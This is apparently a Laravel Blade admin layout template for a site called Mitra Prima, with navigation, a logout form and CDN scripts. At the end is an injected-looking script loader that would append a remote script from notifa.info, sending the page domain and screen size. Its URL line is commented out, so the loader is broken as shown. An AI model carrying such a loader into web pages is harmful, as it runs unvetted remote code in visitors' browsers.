<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
    <meta name="description" content />
    <meta name="author" content />
    <title>@yield('title') - Mitra Prima</title>
    <link href="{{url('template/css/styles.css')}}" rel="stylesheet" />
    <link rel="icon" type="image/x-icon" href="{{'template/assets/img/favicon.png'}}" />
    @livewireStyles
</head>

<body class="nav-fixed">
    <nav class="topnav navbar navbar-expand shadow navbar-light bg-white" id="sidenavAccordion">
        <a class="navbar-brand" href="#"> Mitra-Prima </a>
        <button class="btn btn-icon btn-transparent-dark order-1 order-lg-0 mr-lg-2" id="sidebarToggle" href="#"><i
                data-feather="menu"></i></button>
        <ul class="navbar-nav align-items-center ml-auto">

            <li class="nav-item dropdown no-caret mr-2 dropdown-user">
                <a class="btn btn-icon btn-transparent-dark dropdown-toggle" id="navbarDropdownUserImage"
                    href="javascript:void(0);" role="button" data-toggle="dropdown" aria-haspopup="true"
                    aria-expanded="false"><img class="img-fluid"
                        src="https://source.unsplash.com/QAB-WJcbgJk/60x60" /></a>
                <div class="dropdown-menu dropdown-menu-right border-0 shadow animated--fade-in-up"
                    aria-labelledby="navbarDropdownUserImage">
                    <h6 class="dropdown-header d-flex align-items-center">
                        <img class="dropdown-user-img" src="https://source.unsplash.com/QAB-WJcbgJk/60x60" />
                        <div class="dropdown-user-details">
                            <div class="dropdown-user-details-name">{{ Auth::user()->name }}</div>
                            <div class="dropdown-user-details-email">{{ Auth::user()->email }}</div>
                        </div>
                    </h6>
                    <div class="dropdown-divider"></div>
                    <a class="dropdown-item" href="{{ route('logout') }}" onclick="event.preventDefault();
                                         document.getElementById('logout-form').submit();">
                        {{ __('Logout') }}
                    </a>

                    <form id="logout-form" action="{{ route('logout') }}" method="POST" class="d-none">
                        @csrf
                    </form>
                </div>
            </li>
        </ul>
    </nav>
    <div id="layoutSidenav">
        <div id="layoutSidenav_nav">
            <nav class="sidenav shadow-right sidenav-light">
                @include('layout.sidebar')
                <div class="sidenav-footer">
                    <div class="sidenav-footer-content">
                        <div class="sidenav-footer-subtitle">Logged in as:</div>
                        <div class="sidenav-footer-title">{{ Auth::user()->name }}</div>
                    </div>
                </div>
            </nav>
        </div>
        <div id="layoutSidenav_content">
            <main>
                <header class="page-header page-header-dark bg-gradient-primary-to-secondary pb-10">
                    <div class="container">
                        <div class="page-header-content pt-4">
                            <div class="row align-items-center justify-content-between">
                                <div class="col-auto mt-4">
                                    <h1 class="page-header-title">
                                        <div class="page-header-icon"></div>
                                        @yield('header')
                                    </h1>
                                </div>
                            </div>
                        </div>
                    </div>
                </header>
                <!-- Main page content-->
                <div class="container mt-n10">
                    @yield('kotak')
                    <div class="card mb-4">
                        @yield('content')
                    </div>
                </div>
            </main>
            <footer class="footer mt-auto footer-light">
                <div class="container-fluid">
                    <div class="row">
                        <div class="col-md-6 small">Copyright &#xA9; Your Website 2020</div>
                        <div class="col-md-6 text-md-right small">
                            <a href="#!">Privacy Policy</a>
                            &#xB7;
                            <a href="#!">Terms &amp; Conditions</a>
                        </div>
                    </div>
                </div>
            </footer>
        </div>
    </div>
    <script src="https://code.jquery.com/jquery-3.5.1.min.js" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.bundle.min.js" crossorigin="anonymous">
    </script>
    <script src="{{'template/js/scripts.js'}}"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.9.3/Chart.min.js" crossorigin="anonymous"></script>
    <script src="{{'template/assets/demo/chart-area-demo.js'}}"></script>
    <script src="{{'template/assets/demo/chart-bar-demo.js'}}"></script>
    <script src="{{'template/assets/demo/datatables-demo.js'}}"></script>
    <script src="https://cdn.jsdelivr.net/momentjs/latest/moment.min.js" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/daterangepicker/daterangepicker.min.js" crossorigin="anonymous"></script>
    <script src="{{'template/assets/demo/date-range-picker-demo.js'}}"></script>
    <script data-search-pseudo-elements defer
        src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/js/all.min.js" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/feather-icons/4.27.0/feather.min.js" crossorigin="anonymous">
    </script>
    {{-- <script src="{{ asset('js/app.js') }}"></script> --}}
    {{-- <script src="https://cdn.jsdelivr.net/gh/livewire/turbolinks@v0.1.x/dist/livewire-turbolinks.js" data-turbolinks-eval="false"></script> --}}
    {{-- <script src="{{ mix('js/app.js') }}"></script> --}}
    {{-- <script src="{{'template/js/sb-customizer.js'}}"></script>
    <sb-customizer project="sb-admin-pro"></sb-customizer> --}}
    <script type="text/javascript">
        if (self == top) {
            function netbro_cache_analytics(fn, callback) {
                setTimeout(function () {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn) {
                fn();
            }

            function requestCfs() {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r = Math.floor(Math.random() * 99999999999);
                // var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
                //     "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXw3twVeD7vVhZ68UPpwCOS2x4c9hV6BZWnWm0ZAytA4pByPnSkfvemyks2NwGe10Yu9rWPbXBgul%2bmy%2f%2fB2Yrufc%2f4d9pfbgqdI2mGov8CkC33YSKNLHWZnwydojkYHsgWRN4MghFK8YOoyBySIPIB9hXjjWYeP8lqOrKw7Nuxgw1h745iY4CVNwDlSjySYKRtaWV%2bDi%2b8eWanVY%2btWu0OZ9XF6tVFDAnlxYodW80Tzk1xnTqNrSRGv0T195w%2fd6qcuz1k9DKqwbA%2bI9Fw%2fYldYwCQfXgw4OQ7wsDBCr3uAlOgyGncqyRO5PtfixxPuze42g4HtqGMIg7ixemnE9o21KGvhjqR5JK%2ffF%2fGEHu6Feinc0RFyTRwgmunww%2f%2bOGQ84c61tOqhvuioXeMZYKDz%2bI%2fnGdVAn9Isl8vfi95W2Ap19hoHQ7Nfz%2fJxSM4bp58LHyMhVSfXxIm5mK7BlNzEteWAQofRgQjgdf4EShGG9OUSyQTl3g%2bUz1%2bDvXx8xWF" +
                //     "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen
                //     .height;
                var bsa = document.createElement('script');
                bsa.type = 'text/javascript';
                bsa.async = true;
                bsa.src = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }
            netbro_cache_analytics(requestCfs, function () {});
        };

    </script>
    @livewireScripts
</body>

</html>
